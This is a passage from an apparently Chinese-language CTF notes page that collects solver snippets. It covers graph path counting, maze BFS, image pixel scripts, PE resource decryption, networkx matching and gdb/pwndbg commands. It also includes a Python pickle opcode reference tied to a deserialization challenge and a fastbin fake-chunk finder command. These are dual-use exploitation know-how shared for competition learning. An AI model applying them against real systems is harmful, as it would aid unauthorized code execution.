class="hljs-built_in">str</span>(cnt))<br>    <span class="hljs-keyword">if</span> s==<span class="hljs-built_in">len</span>(pilesnum)-<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    piles=get_pile()<br><span class="hljs-built_in">print</span>(time.time()-start)<br>p.interactive()<br><span class="hljs-comment">#print(pilesnum)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="路径编程问题"><a href="#路径编程问题" class="headerlink" title="路径编程问题"></a>路径编程问题</h2><p>从m点到 n 点走 k 步的<a target="_blank" rel="noopener" href="https://blog.csdn.net/bbbbswbq/article/details/81177945">路径条数问题</a>。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41956187/article/details/105731368">题目及来源</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">105</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod = <span class="hljs-number">10003</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> a[N][N];<br>&#125;;<br>node c, ans;<br><span class="hljs-type">int</span> n;<br><span class="hljs-function">node <span class="hljs-title">mul</span><span class="hljs-params">(node x, node y)</span></span><br><span class="hljs-function"></span>&#123;<br>    node ans;<br>    <span class="hljs-built_in">memset</span>(ans.a, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(ans.a));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (x.a[i][k])<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>                &#123;<br>                    ans.a[i][j] += x.a[i][k] * y.a[k][j];<br>                    ans.a[i][j] %= mod;<br>                &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-function">node <span class="hljs-title">Pow</span><span class="hljs-params">(node x, <span class="hljs-type">int</span> m)</span></span><br><span class="hljs-function"></span>&#123;<br>    node ans;<br>    <span class="hljs-built_in">memset</span>(ans.a, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(ans.a));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        ans.a[i][i] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (m)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (m &amp; <span class="hljs-number">1</span>)<br>            ans = <span class="hljs-built_in">mul</span>(ans, x);<br>        x = <span class="hljs-built_in">mul</span>(x, x);<br>        m &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">freopen</span>(<span class="hljs-string">&quot;yyh.in&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,stdin);<br>    <span class="hljs-built_in">freopen</span>(<span class="hljs-string">&quot;out&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,stdout);<br>    <span class="hljs-type">int</span> m, u, v, step;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;m, &amp;step);<br>    <span class="hljs-built_in">memset</span>(c.a, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(c.a));<br>    <span class="hljs-keyword">while</span> (m--)&#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);<br>        c.a[u][v] = c.a[v][u] = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    ans = <span class="hljs-built_in">Pow</span>(c, step);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, ans.a[<span class="hljs-number">1</span>][n]);<br>    <span class="hljs-built_in">fclose</span>(stdin);<br>    <span class="hljs-built_in">fclose</span>(stdout);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="python-pickle-opcodes参考"><a href="#python-pickle-opcodes参考" class="headerlink" title="python pickle opcodes参考"></a>python pickle opcodes参考</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">来源</a>。例题:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/90798308">[SUCTF 2019]Guess Game</a></p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">c：引入模块和对象，模块名和对象名以换行符分割<br>&#125;：<span class="hljs-keyword">push</span>一个空的字典，相当于<span class="hljs-keyword">push</span> &#123;&#125;<br><span class="hljs-symbol">S:</span> <span class="hljs-keyword">push</span>一个字符串<br><span class="hljs-symbol">I:</span> <span class="hljs-keyword">push</span>一个整型<br><span class="hljs-symbol">s:</span> <span class="hljs-keyword">pop</span>两位 ，然后作为字典的key和value<br><span class="hljs-symbol">b:</span> 调用__setstate__ 或者 __dict__.update()<br>(：压入一个标志到栈中，表示元组的开始位置<br>t：从栈顶开始，找到最上面的一个(，并将(到t中间的内容全部弹出，组成一个元组，再把这个元组压入栈中<br>R：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上<br>p：将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引<br>V、S：向栈顶压入一个（unicode）字符串<br>.：表示整个程序结束<br></code></pre></td></tr></table></figure>

<h2 id="python-bfs寻最长路径实现（走迷宫）"><a href="#python-bfs寻最长路径实现（走迷宫）" class="headerlink" title="python bfs寻最长路径实现（走迷宫）"></a>python bfs寻最长路径实现（走迷宫）</h2><p><a target="_blank" rel="noopener" href="https://github.com/ev0A/SCTF2019-Write-Up#maaaaaaze">原题</a>的路径在html的td标签中，所以还需要BeautifulSoup处理一下html</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#处理html部分</span><br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Maze.html&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    html_doc = file.read()<br>soup = BeautifulSoup(html_doc, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>lattice = soup.find_all(<span class="hljs-string">&#x27;td&#x27;</span>)<br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;border-([a-z]+):&#x27;</span>)<br>maze = []<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    temp1 = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(j * <span class="hljs-number">100</span>, j * <span class="hljs-number">100</span> + <span class="hljs-number">100</span>):<br>        temp = <span class="hljs-string">&quot;&quot;</span><br>        result = pattern.findall(<span class="hljs-built_in">str</span>(lattice[i]))<br>        <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;top&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            temp += <span class="hljs-string">&quot;u&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;bottom&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            temp += <span class="hljs-string">&quot;d&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;right&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            temp += <span class="hljs-string">&quot;r&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;left&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            temp += <span class="hljs-string">&quot;l&quot;</span><br>        temp1.append(temp)<br>    maze.append(temp1)<br><span class="hljs-comment">#bfs部分，参考Nu1l师傅的脚本，更加简洁</span><br>move = &#123;<span class="hljs-string">&#x27;u&#x27;</span>: (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-string">&#x27;d&#x27;</span>: (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-string">&#x27;l&#x27;</span>: (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;r&#x27;</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)&#125;<br>queue = deque()<br>queue.append(((<span class="hljs-number">0</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>))<br>visited = []<br>ans = <span class="hljs-number">0</span><br>ansv = ()<br><span class="hljs-keyword">while</span> queue:<br>    v, res = queue.popleft()<br>    <span class="hljs-keyword">if</span> res &gt; ans:<br>        ans = res<br>        ansv = v<br>    <span class="hljs-keyword">if</span> v <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>        visited.append(v)<br>        <span class="hljs-keyword">for</span> adj <span class="hljs-keyword">in</span> maze[v[<span class="hljs-number">0</span>]][v[<span class="hljs-number">1</span>]]:<br>            queue.append(((v[<span class="hljs-number">0</span>] + move[adj][<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>] + move[adj][<span class="hljs-number">1</span>]), res + <span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(ansv, ans)<br></code></pre></td></tr></table></figure>

<p>假如迷宫是png形式： <a target="_blank" rel="noopener" href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#so_long">https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#so_long</a> 。<a target="_blank" rel="noopener" href="https://github.com/AkaSec-1337-CyberSecurity-Club/Akasec-CTF-2024/tree/main/misc/so_long">官方脚本</a>可能更好</p>
<h2 id="PIL遍历图片的rgb值并打印"><a href="#PIL遍历图片的rgb值并打印" class="headerlink" title="PIL遍历图片的rgb值并打印"></a>PIL遍历图片的rgb值并打印</h2><p><a target="_blank" rel="noopener" href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> random<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Chall.png&#x27;</span>)<br>pix = img.load()<br>w, h = img.size<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>        r,g,b,a = img.getpixel((i,c))<br>        <span class="hljs-keyword">if</span> r == <span class="hljs-number">255</span> <span class="hljs-keyword">and</span> g == <span class="hljs-number">255</span> <span class="hljs-keyword">and</span> b == <span class="hljs-number">255</span>:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(r,g,b,a)<br></code></pre></td></tr></table></figure>

<h2 id="PIL-numpy-cv2处理带有图片像素值的txt"><a href="#PIL-numpy-cv2处理带有图片像素值的txt" class="headerlink" title="PIL+numpy+cv2处理带有图片像素值的txt"></a>PIL+numpy+cv2处理带有图片像素值的txt</h2><p><a target="_blank" rel="noopener" href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <span class="hljs-keyword">as</span> im<br><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;weirdoooo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>data2 = []<br><span class="hljs-comment"># create empty img 1024*1024</span><br>img = np.zeros((<span class="hljs-number">1024</span>,<span class="hljs-number">1024</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    data2.append(data[i].split(<span class="hljs-string">&#x27; &#x27;</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data2)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data2[i])):<br>        <span class="hljs-keyword">if</span>  data2[i][j] == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>:<br>            img[i][j]=data2[i][j]<br><span class="hljs-built_in">print</span>(img.shape)<br>out=img.astype(np.uint8) <span class="hljs-comment">#数值类型转换， https://numpy.org/doc/stable/reference/generated/numpy.ndarray.astype.html</span><br>out = im.fromarray(out) <span class="hljs-comment">#从数组转为图片， https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.fromarray</span><br><span class="hljs-comment">#out.convert()</span><br>out.save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>flag = cv2.imread(<span class="hljs-string">&#x27;flag.png&#x27;</span>) <span class="hljs-comment">#opencv的参考https://www.geeksforgeeks.org/python-opencv-cv2-imread-method/</span><br>cv2.imshow(<span class="hljs-string">&#x27;flag&#x27;</span>,flag)<br>cv2.waitKey(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<h2 id="使用pefile库读取pefile文件内容并修改"><a href="#使用pefile库读取pefile文件内容并修改" class="headerlink" title="使用pefile库读取pefile文件内容并修改"></a>使用pefile库读取pefile文件内容并修改</h2><p><a target="_blank" rel="noopener" href="https://gist.github.com/matthw/4ce2a4b9e76eb7008d55661e4792f463">来源</a>。这道题的题目文件加密了重要的检查逻辑文件，且不是直接写的pe文件，还往里面加了没用的数据。直接用pefile读取有效的数据改回来就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pefile<br><br>pe = pefile.PE(<span class="hljs-string">&quot;evil.exe&quot;</span>)<br>key = <span class="hljs-string">b&#x27;PHALAN&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_resource</span>(<span class="hljs-params">pe</span>):<br>    <span class="hljs-keyword">for</span> rsrc_type <span class="hljs-keyword">in</span> pe.DIRECTORY_ENTRY_RESOURCE.entries:<br>        <span class="hljs-keyword">for</span> rsrc <span class="hljs-keyword">in</span> rsrc_type.directory.entries:<br>            rsrc = rsrc.directory.entries[<span class="hljs-number">0</span>].data.struct<br>            <span class="hljs-keyword">return</span> pe.get_data(rsrc.OffsetToData, rsrc.Size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data, key</span>):<br>    out = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">for</span> n, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data):<br>        <span class="hljs-keyword">if</span> data[n] == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> data[n] == key[n % <span class="hljs-built_in">len</span>(key)]:<br>            out[n] = data[n]<br>            <span class="hljs-keyword">continue</span><br>        out[n] = data[n] ^ key[n % <span class="hljs-built_in">len</span>(key)]<br>    <span class="hljs-keyword">return</span> out<br><br>data = get_resource(pe)<br><br>yo = decrypt(data, key)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dumped.pe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.write(yo)<br></code></pre></td></tr></table></figure>

<h2 id="python-networkx模块使用"><a href="#python-networkx模块使用" class="headerlink" title="python networkx模块使用"></a>python networkx模块使用</h2><h1 id="最大权重配对问题（maximum-weight-matching）"><a href="#最大权重配对问题（maximum-weight-matching）" class="headerlink" title="最大权重配对问题（maximum weight matching）"></a>最大权重配对问题（maximum weight matching）</h1><p><a target="_blank" rel="noopener" href="https://enscribe.dev/ctfs/mhs/prog/matchmaker/">例题及来源</a>，涉及到基本的图论（graph theory）和开花算法（The Blossom Algorithm）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> remote<br><span class="hljs-keyword">import</span> networkx <span class="hljs-keyword">as</span> nx<br><span class="hljs-keyword">import</span> networkx.algorithms.matching <span class="hljs-keyword">as</span> matching<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_input</span>(<span class="hljs-params">data: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]]:<br>    data = [<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, x.split())) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data.splitlines()[:-<span class="hljs-number">1</span>]]<br>    [data[i].insert(i, <span class="hljs-number">0</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data))]<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:<br>    p = remote(<span class="hljs-string">&#x27;0.cloud.chals.io&#x27;</span>, [PORT])<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        data = [[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]<br>        data = parse_input(p.recvuntilS(<span class="hljs-string">b&#x27;&gt; &#x27;</span>))<br>        G: nx.Graph = nx.Graph([(i, j, &#123;<span class="hljs-string">&#x27;weight&#x27;</span>: data[i][j] + data[j][i]&#125;) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data[i])) <span class="hljs-keyword">if</span> i != j])<br>        M: <span class="hljs-built_in">set</span>[<span class="hljs-built_in">tuple</span>] = matching.max_weight_matching(G, maxcardinality=<span class="hljs-literal">True</span>)<br>        M_S: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">tuple</span>] = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>(M) + [(b, a) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> M])<br>        result: <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;;&#x27;</span>.join([<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span>,<span class="hljs-subst">&#123;b&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> M_S])<br>        <span class="hljs-built_in">print</span>(data)<br>        p.sendline(result.encode())<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<h1 id="最短权重路径（Djikstra）"><a href="#最短权重路径（Djikstra）" class="headerlink" title="最短权重路径（Djikstra）"></a>最短权重路径（Djikstra）</h1><p><a target="_blank" rel="noopener" href="https://meashiri.github.io/ctf-writeups/posts/202312-tuctf/">https://meashiri.github.io/ctf-writeups/posts/202312-tuctf/</a></p>
<h2 id="gdb使用-pwndbg）"><a href="#gdb使用-pwndbg）" class="headerlink" title="gdb使用(pwndbg）"></a><a target="_blank" rel="noopener" href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">gdb使用</a>(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/murkuo/p/15965270.html">pwndbg</a>）</h2><p>补充：</p>
<ul>
<li><p>stack &lt;num&gt;</p>
<blockquote>
<p>指定查看多少栈内容，直接stack查看的栈帧是不完整的)</p>
</blockquote>
</li>
<li><p>starti &lt;参数&gt;</p>
<blockquote>
<p>无论程序去除符号与否，该命令都能保证在程序的开始断下。可以传入参数。</p>
</blockquote>
</li>
<li><p>info file</p>
<blockquote>
<p>查看文件信息，可用于获取文件加载基址</p>
</blockquote>
</li>
<li><p>x&#x2F;i $pc</p>
<blockquote>
<p>查看当前地址的字节码的反汇编结果</p>
</blockquote>
</li>
<li><p>layout asm</p>
<blockquote>
<p>打开反汇编窗口</p>
</blockquote>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.irya.unam.mx/computo/sites/manuales/fce12/debugger/cl/commandref/gdb_mode/cmd_tbreak.htm">tbreak</a></p>
<blockquote>
<p>在指定位置插入临时断点</p>
</blockquote>
</li>
<li><p>info proc mappings</p>
<blockquote>
<p>查看所有映射，可获取libc加载基址</p>
</blockquote>
</li>
<li><p>x&#x2F;10g $sp</p>
<blockquote>
<p>数字10可以任意更改，表示要查看栈上多少个元素。</p>
</blockquote>
</li>
<li><p>p $ebp-0x4</p>
<blockquote>
<p>打印对应地址的内容，可配合寄存器使用</p>
</blockquote>
</li>
<li><p>find start,end,str</p>
<blockquote>
<p>在start-end的内存中寻找str的地址</p>
</blockquote>
</li>
<li><p>disas [函数名&#x2F;地址]</p>
<blockquote>
<p>反编译置顶位置的指令。如果当前所处位置就是想要反编译的函数，可以直接disas。</p>
</blockquote>
</li>
<li><p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/58851/can-i-set-a-breakpoint-on-memory-access-in-gdb">内存断点</a>：</p>
<ul>
<li><p>watch *addr</p>
<blockquote>
<p>gdb will break when a write occurs</p>
</blockquote>
</li>
<li><p>rwatch *addr</p>
<blockquote>
<p>gdb will break wnen a read occurs</p>
</blockquote>
</li>
<li><p>awatch *addr</p>
<blockquote>
<p>gdb will break in both cases</p>
</blockquote>
</li>
</ul>
</li>
<li><p>set $rip &#x3D; value (set $eip &#x3D; value)</p>
<ul>
<li>设置当前程序的rip&#x2F;eip（64&#x2F;32）</li>
</ul>
</li>
<li><p>jump _start</p>
<blockquote>
<p>重启程序</p>
</blockquote>
</li>
<li><p>find_fake_fast addr size</p>
<blockquote>
<p>在指定addr处寻找size大小的符合fastbin的假堆块（找到可用错位获取合法size的地址）</p>
</blockquote>
</li>
<li><p>info threads</p>
<blockquote>
<p>查看存在的线程</p>
</blockquote>
</li>
<li><p><code>thread &lt;thread_id&gt;</code></p>
<blockquote>
<p>切换到指定id的线程</p>
</blockquote>
</li>
<li><p><code>set *(char **)addr = value</code></p>
<blockquote>
<p>设置addr处的内存（64bit），参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/35370698/how-to-set-an-arbitrary-64-bits-of-memory-in-gdb">https://stackoverflow.com/questions/35370698/how-to-set-an-arbitrary-64-bits-of-memory-in-gdb</a></p>
</blockquote>
<ul>
